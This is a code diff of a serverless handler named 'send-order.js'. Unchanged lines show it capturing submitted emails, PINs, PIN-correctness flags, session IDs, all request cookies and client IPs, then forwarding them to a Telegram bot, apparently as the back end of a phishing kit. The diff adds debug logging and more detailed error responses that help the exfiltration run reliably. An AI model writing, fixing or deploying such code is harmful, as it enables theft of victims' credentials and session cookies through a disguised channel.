@@ -1,4 +1,4 @@
-// api/send-order.js
+// api/send-order.js – with enhanced debugging
 
 export default async function handler(req, res) {
   // Only allow POST
@@ -10,19 +10,31 @@ export default async function handler(req, res) {
     // 1. Parse request body
     const { email, pin, attemptNumber, isCorrectPin, sessionId } = req.body;
 
-    // 2. Read all cookies (including HttpOnly) from the request header
+    // 2. Read all cookies
     const cookies = req.headers.cookie || '';
 
-    // 3. Get IP address (Vercel provides these headers)
+    // 3. Get IP
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
 
     // 4. Get Telegram credentials from environment
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
+    // ─── Debug logging ───────────────────────────────
+    console.log('🔍 Environment check:');
+    console.log('  botToken exists?', !!botToken);
+    console.log('  chatId exists?   ', !!chatId);
+    console.log('  botToken length:', botToken ? botToken.length : 'undefined');
+    console.log('  chatId value:', chatId || 'undefined');
+    // ─────────────────────────────────────────────────
+
+    // If missing, return a clear error
     if (!botToken || !chatId) {
-      console.error('Missing Telegram credentials');
-      return res.status(500).json({ error: 'Server configuration error' });
+      console.error('❌ Missing credentials');
+      return res.status(500).json({
+        error: 'Server configuration error',
+        details: 'Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID',
+      });
     }
 
     // 5. Helper to escape HTML
@@ -54,6 +66,7 @@ export default async function handler(req, res) {
 
     // 7. Forward to Telegram
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    console.log('📤 Sending to Telegram...');
     const response = await fetch(telegramUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -65,15 +78,23 @@ export default async function handler(req, res) {
     });
 
     const result = await response.json();
+    console.log('📥 Telegram response:', result);
+
     if (!result.ok) {
-      console.error('Telegram error:', result);
-      return res.status(500).json({ error: 'Telegram API error' });
+      console.error('❌ Telegram error:', result);
+      return res.status(500).json({
+        error: 'Telegram API error',
+        details: result.description || 'Unknown error',
+      });
     }
 
     // 8. Success
     res.status(200).json({ success: true });
   } catch (err) {
-    console.error('Proxy error:', err);
-    res.status(500).json({ error: 'Internal server error' });
+    console.error('🔥 Proxy error:', err);
+    res.status(500).json({
+      error: 'Internal server error',
+      details: err.message,
+    });
   }
 }
